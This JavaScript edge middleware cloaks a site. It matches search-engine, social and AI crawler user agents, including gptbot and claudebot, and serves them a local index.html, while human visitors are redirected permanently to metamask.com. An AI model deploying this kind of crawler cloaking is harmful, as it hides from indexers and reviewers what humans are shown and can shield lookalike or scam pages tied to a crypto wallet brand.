const BOT_UA = new RegExp(
  [
    "googlebot", "bingbot", "baiduspider", "yandex", "duckduckbot", "slurp",
    "ia_archiver", "facebookexternalhit", "twitterbot", "whatsapp", "telegrambot",
    "slackbot", "discordbot", "pinterest", "linkedinbot", "applebot", "semrushbot",
    "ahrefsbot", "mj12bot", "dotbot", "petalbot", "bytespider",
    "google-inspectiontool", "googleother", "adsbot-google", "mediapartners-google",
    "feedfetcher-google", "gptbot", "ccbot", "claudebot", "anthropic-ai",
    "perplexitybot", "bingpreview",
  ].join("|"),
  "i"
);

export default function middleware(request) {
  const ua = request.headers.get("user-agent") || "";

  // Bot → no Response returned, so routing continues to public/index.html
  if (BOT_UA.test(ua)) {
    return;
  }

  // Human → 308 permanent redirect (matches your "permanent": true)
  return Response.redirect("https://metamask.com", 308);
}

export const config = {
  matcher: "/",
};
